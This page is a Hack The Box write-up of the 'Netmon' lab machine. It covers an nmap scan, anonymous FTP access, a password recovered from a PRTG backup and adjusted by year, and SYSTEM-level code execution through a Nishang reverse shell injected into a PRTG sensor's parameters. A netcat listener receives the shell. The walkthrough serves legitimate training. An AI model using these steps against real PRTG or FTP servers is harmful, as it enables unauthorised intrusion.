@@ -1,0 +1,612 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Netmon - Hack The Box - hackcommander.io</title>
+<meta name="description" content="I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang’s reverse shell oneliner.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Netmon - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-netmon/">
+
+
+  <meta property="og:description" content="I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang’s reverse shell oneliner.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-netmon/netmon_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-06-29T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-netmon/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Netmon - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Netmon - Hack The Box">
+    <meta itemprop="description" content="I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang’s reverse shell oneliner.">
+    <meta itemprop="datePublished" content="June 29, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Netmon - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-06-29T00:00:00+02:00">June 29, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-netmon/netmon_logo.png" alt="" /></p>
+
+<p>I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang’s reverse shell oneliner.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>We can log in with anonymous FTP and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag directly from the Public user folder</li>
+  <li>There’s a PRTG configuration backup containing an old password that we can download from FTP</li>
+  <li>The PRTG password is the almost the same as the one found in the old backup but it ends with <code class="language-plaintext highlighter-rouge">2019</code> instead of <code class="language-plaintext highlighter-rouge">2018</code></li>
+  <li>We can get RCE using Powershell scripts running as sensors in PRTG</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="nmap-scan">Nmap scan</h3>
+
+<p>The nmap scan shows that anonymous FTP is allowed and that PRTG is running on the webserver.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -F 10.10.10.152
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 22:43 EST
+Nmap scan report for netmon.htb (10.10.10.152)
+Host is up (0.0090s latency).
+Not shown: 95 closed ports
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h3 id="free-flag-from-ftp">Free flag from FTP</h3>
+
+<p>In the nmap scan, the script identified that the FTP server allows anonymous access. Because we’re not constrained to <code class="language-plaintext highlighter-rouge">ftproot</code> and we can look around the entire disk of the box, I quickly found a <code class="language-plaintext highlighter-rouge">user.txt</code> flag in the <code class="language-plaintext highlighter-rouge">c:\users\public</code> folder.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; cd /users/public
+250 CWD command successful.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  07:05AM       &lt;DIR&gt;          Documents
+07-16-16  08:18AM       &lt;DIR&gt;          Downloads
+07-16-16  08:18AM       &lt;DIR&gt;          Music
+07-16-16  08:18AM       &lt;DIR&gt;          Pictures
+02-02-19  11:35PM                   33 user.txt
+07-16-16  08:18AM       &lt;DIR&gt;          Videos
+226 Transfer complete.
+ftp&gt; type binary
+200 Type set to I.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+33 bytes received in 0.01 secs (4.5173 kB/s)
+ftp&gt; exit
+221 Goodbye.
+
+root@ragingunicorn:~/htb/netmon# cat user.txt
+dd58c...
+</code></pre></div></div>
+
+<p>I was too slow for first blood, someone else on HTB got user blood in under 2 minutes.</p>
+
+<h3 id="getting-access-to-prtg">Getting access to PRTG</h3>
+
+<p>The PRTG application is running on port 80:</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_login.png" alt="" /></p>
+
+<p>I tried the default credentials <code class="language-plaintext highlighter-rouge">prtgadmin</code> / <code class="language-plaintext highlighter-rouge">prtgadmin</code> but I got access denied.</p>
+
+<p>Looking in the filesystem, I found that the configuration directory for PRTG is under <code class="language-plaintext highlighter-rouge">c:\programdata\paessler</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; cd /programdata
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-02-19  11:15PM       &lt;DIR&gt;          Licenses
+11-20-16  09:36PM       &lt;DIR&gt;          Microsoft
+02-02-19  11:18PM       &lt;DIR&gt;          Paessler
+</code></pre></div></div>
+
+<p>I found the configuration file and an old configuration from last year.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; cd "PRTG Network Monitor"
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+[...]
+02-25-19  09:54PM              1189697 PRTG Configuration.dat
+03-02-19  05:33PM              1198465 PRTG Configuration.old
+07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">PRTG Configuration.dat</code> config file contains the credentials for user <code class="language-plaintext highlighter-rouge">prtgadmin</code> but they are encrypted (or hashed?) with what seems to be a proprietary method.</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_new_creds.png" alt="" /></p>
+
+<p>When I checked <code class="language-plaintext highlighter-rouge">PRTG Configuration.old.bak</code>, I found the dbpassword: <code class="language-plaintext highlighter-rouge">PrTg@dmin2018</code></p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_old_creds.png" alt="" /></p>
+
+<p>I tried this password with user <code class="language-plaintext highlighter-rouge">prtgadmin</code> on the PRTG login page but it didn’t work. Then I realized that this is from a 2018 backup, maybe the admin is lazy and re-used the dbpassword for the admin account and simply used the current date (2019).</p>
+
+<p>My guess was correct and I was able to log in with password <code class="language-plaintext highlighter-rouge">PrTg@dmin2019</code></p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_mainpage.png" alt="" /></p>
+
+<h3 id="rce-through-prtg-sensors">RCE through PRTG sensors</h3>
+
+<p>PRTG is a monitoring tool that supports a whole suite of sensors, like ping, http, snmp, etc. The server itself has been added in the device list, so it’s safe to assume we can add sensors to it:</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_devices.png" alt="" /></p>
+
+<p>I clicked add sensor on the 10.10.10.152 server then selected <code class="language-plaintext highlighter-rouge">EXE/Script sensor</code>.</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_exe.png" alt="" /></p>
+
+<p>We can’t add powershell custom scripts because we don’t have write access to the application directory, but we can leverage the <code class="language-plaintext highlighter-rouge">Parameters</code> field to add additional code at the end of an existing Powershell script. I used Nishang to get a reverse shell. I added a semi colon at the beginning of the parameters, then pasted the Nishang code after.</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_rce.png" alt="" /></p>
+
+<p>After the sensor is created, we hit the play button to execute it.</p>
+
+<p><img src="/assets/images/htb-writeup-netmon/prtg_rce2.png" alt="" /></p>
+
+<p>And we get a shell as <code class="language-plaintext highlighter-rouge">nt authority\system</code>. Box done!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.152] 55751
+
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+PS C:\Windows\system32&gt; type c:\users\administrator\desktop\root.txt
+30189...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#config-backups" class="page__taxonomy-item" rel="tag">config backups</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ftp" class="page__taxonomy-item" rel="tag">ftp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nishang" class="page__taxonomy-item" rel="tag">nishang</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#prtg" class="page__taxonomy-item" rel="tag">prtg</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-29T00:00:00+02:00">June 29, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-querier/" class="pagination--pager" title="Querier - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-hackback/" class="pagination--pager" title="Hackback - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
